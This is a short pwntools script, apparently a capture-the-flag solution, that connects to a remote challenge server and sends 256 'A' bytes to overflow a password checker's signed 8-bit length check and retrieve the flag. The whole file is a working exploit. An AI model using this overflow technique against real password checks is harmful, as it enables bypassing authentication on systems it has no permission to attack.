#!/usr/bin/env python3
from pwn import *
import time

# Connect to the program
# p = process('./password_checker')

# Connect to server
p = remote('140.113.207.245', 30170)

# Create a password that will cause integer overflow
# We need a string long enough to make strlen return a value that when stored in int8_t becomes negative
# 256 bytes should be enough to cause the overflow
payload = b'A' * 256

# Send the payload
p.sendline(payload)

# Receive the banner
p.recvuntil(b"Type Your Password: ")

# Receive the "bad password" message
p.recvline()

# Receive the flag
flag = p.recvline().decode().strip()
print(f"\033[93;1mFlag: {flag}\033[0m")

# Close the connection
p.close()
